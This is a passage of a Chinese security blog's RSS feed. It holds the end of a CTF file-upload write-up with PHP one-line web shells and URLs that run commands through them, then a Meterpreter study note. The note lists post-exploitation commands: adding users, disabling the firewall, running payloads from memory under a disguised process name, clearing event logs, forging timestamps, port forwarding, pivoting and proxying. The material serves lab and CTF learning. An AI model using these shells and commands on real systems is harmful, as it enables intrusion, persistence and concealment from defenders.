&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php eval($_REQUEST[cmd]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system($_REQUEST[cmd]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP的eval类型函数，一句话：代码执行而不是命令执行。（菜刀用这类）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP的system类型函数，一句话：命令执行而不是代码执行。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://IP/upload/b.php?cmd=system(&amp;quot;dir c:\\&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://IP/upload/b.php?cmd=system(&amp;quot;type c:\\flag*.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://IP/upload/b.php?cmd=dir c:\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://IP/upload/b.php?cmd=type c:\flag*.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;拓展过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拓展过滤&#34;&gt;#&lt;/a&gt; 拓展 (过滤 &amp;lt;?)&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210314105556365.png&#34; alt=&#34;image-20210314105556365&#34;&gt;&lt;/p&gt;
&lt;p&gt;buuctf 题目：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzdmMDJmM2Y0LWU2NjUtNDVkZC04NTcyLTFiYjNlZGIxNmE4MS5ub2RlMy5idXVvai5jbi8=&#34;&gt;http://7f02f3f4-e665-45dd-8572-1bb3edb16a81.node3.buuoj.cn/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;进行 burp 抓包上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210314105809630.png&#34; alt=&#34;image-20210314105809630&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210314105819324.png&#34; alt=&#34;image-20210314105819324&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210314110325454.png&#34; alt=&#34;image-20210314110325454&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210314110346852.png&#34; alt=&#34;image-20210314110346852&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/</guid>
            <title>meterpreter学习笔记</title>
            <link>https://chungod.github.io/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/</link>
            <category>meterpreter学习笔记</category>
            <pubDate>Wed, 21 Apr 2021 10:24:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;meterpreter学习笔记总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meterpreter学习笔记总结&#34;&gt;#&lt;/a&gt; meterpreter 学习笔记总结&lt;/h2&gt;
&lt;h2 id=&#34;系统命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统命令&#34;&gt;#&lt;/a&gt; 系统命令&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;background # 将当前会话放置后台&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sessions # sessions –h 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sessions -i &amp;lt;ID 值&amp;gt; #进入会话 -k 杀死会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bgrun / run # 执行已有的模块，输入 run 后按两下 tab，列出已有的脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info # 查看已有模块信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getuid # 查看当前用户身份&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getprivs # 查看当前用户具备的权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getpid # 获取当前进程 ID(PID)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sysinfo # 查看目标机系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;irb # 开启 ruby 终端&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps # 查看正在运行的进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kill &amp;lt;PID 值&amp;gt; # 杀死指定 PID 进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;idletime # 查看目标机闲置时间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reboot / shutdown # 重启/关机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell # 进入目标机 cmd shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164115799.png&#34; alt=&#34;image-20210306164115799&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;常用-cmd-命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用-cmd-命令&#34;&gt;#&lt;/a&gt; 常用 cmd 命令&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;whoami # 当前权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;quser # 查询当前在线的管理员&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user # 查看存在用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user 用户名 密码 /add # 添加用户和对应密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net localgroup 用户组名 用户名 /add # 将指定用户添加到指定用户组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -ano # 查询当前计算机中网络连接通信情况，LISTENING 表示该端口处于监听状态；ESTABLISHED 表示该端口处于工作（通信）状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systeminfo # 查看当前计算机中的详细情况&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist /svc # 查看每个进程所对应的服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;taskkill /f /im 程序名称 # 结束某个指定名称的程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;taskkill /f /PID ID # 结束某个指定 PID 的进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tasklist | findstr &amp;quot;字符串&amp;quot; # 查找输出结果中指定的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;logoff # 注销某个指定用户的 ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shutdown -r # 重启当前计算机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netsh adcfirewall set allprofiles state off # 关闭防火墙&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164329741.png&#34; alt=&#34;image-20210306164329741&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;uictl-开关键盘鼠标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uictl-开关键盘鼠标&#34;&gt;#&lt;/a&gt; uictl 开关键盘 / 鼠标&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uictl [enable/disable] [keyboard/mouse/all] # 开启或禁止键盘/鼠标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uictl disable mouse # 禁用鼠标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uictl disable keyboard # 禁用键盘&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164436345.png&#34; alt=&#34;image-20210306164436345&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execute-执行文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#execute-执行文件&#34;&gt;#&lt;/a&gt; execute 执行文件&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;execute #在目标机中执行文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;execute -H -i -f cmd.exe # 创建新进程 cmd.exe，-H 不可见，-i 交互&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;execute -H -m -d notepad.exe -f payload.exe -a &amp;quot;-o hack.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;-o hack.txt&amp;quot;是 payload.exe 的运行参数&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164555155.png&#34; alt=&#34;image-20210306164555155&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;clearav-清除日志&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#clearav-清除日志&#34;&gt;#&lt;/a&gt; clearav 清除日志&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;clearav # 清除 windows 中的应用程序日志、系统日志、安全日志&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164632840.png&#34; alt=&#34;image-20210306164632840&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;文件系统命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件系统命令&#34;&gt;#&lt;/a&gt; 文件系统命令&lt;/h2&gt;
&lt;p&gt;基本文件系统命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls # 列出当前目录中的文件列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd # 进入指定目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getwd / pwd # 查看当前工作目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search -d c:\\ -f *.txt # 搜索文件 -d 目录 -f 文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat c:\\123.txt # 查看文件内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload /tmp/hack.txt C:\\ # 上传文件到目标机上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;download c:\\123.txt /tmp/ # 下载文件到本机上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit c:\\test.txt # 编辑或创建文件 没有的话，会新建文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm C:\\hack.txt # 删除文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir admin # 只能在当前目录下创建文件夹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmdir admin # 只能删除当前目录下文件夹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getlwd / lpwd # 查看本地当前目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lcd /tmp # 切换本地目录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164754287.png&#34; alt=&#34;image-20210306164754287&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;timestomp-伪造时间戳&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#timestomp-伪造时间戳&#34;&gt;#&lt;/a&gt; timestomp 伪造时间戳&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;timestomp C:\\ -h #查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;timestomp -v C:\\2.txt #查看时间戳&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;timestomp C:\\2.txt -f C:\\1.txt #将 1.txt 的时间戳复制给 2.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;timestomp c:\\test\\22.txt -z &amp;quot;03/10/2019 11:55:55&amp;quot; -v # 把四个属性设置为统一时间&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306164910512.png&#34; alt=&#34;image-20210306164910512&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络命令&#34;&gt;#&lt;/a&gt; 网络命令&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ipconfig/ifconfig # 查看网络接口信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat –ano # 查看网络连接状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;arp # 查看 arp 缓冲表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getproxy # 查看代理信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;route # 查看路由表信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;portfwd-端口转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#portfwd-端口转发&#34;&gt;#&lt;/a&gt; portfwd 端口转发&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;portfwd add -l 1234 -p 3389 -r 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#将目标机的 3389 端口转发到本地 1234 端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop 127.0.0.1:1234 # 需要输入用户名密码连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop -u Administrator -p P@ssw0rd 127.0.0.1:1234 # -u 用户名 -p 密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306165457433.png&#34; alt=&#34;image-20210306165457433&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306165547893.png&#34; alt=&#34;image-20210306165547893&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;autoroute-添加路由&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#autoroute-添加路由&#34;&gt;#&lt;/a&gt; autoroute 添加路由&lt;/h3&gt;
&lt;p&gt;参考  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY1MDU=&#34;&gt;https://www.anquanke.com/post/id/86505&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -h # 查看帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run get_local_subnets # 查看目标内网网段地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -s 192.168.183.0/24 # 添加目标网段路由&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p # 查看添加的路由&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306165902512.png&#34; alt=&#34;image-20210306165902512&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 arp_scanner、portscan 等进行扫描&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.183.0/24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run auxiliary/scanner/portscan/tcp RHOSTS=192.168.183.146 PORTS=3389&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306170155805.png&#34; alt=&#34;image-20210306170155805&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306170548344.png&#34; alt=&#34;image-20210306170548344&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;socks-代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socks-代理&#34;&gt;#&lt;/a&gt; Socks 代理&lt;/h3&gt;
&lt;p&gt;只有在目标设备添加完路由后才可以通过 msf 自带的 socks4a 模块进行 socks4 代理转发&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/server/socks4a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set srvhost 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set srvport 2000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
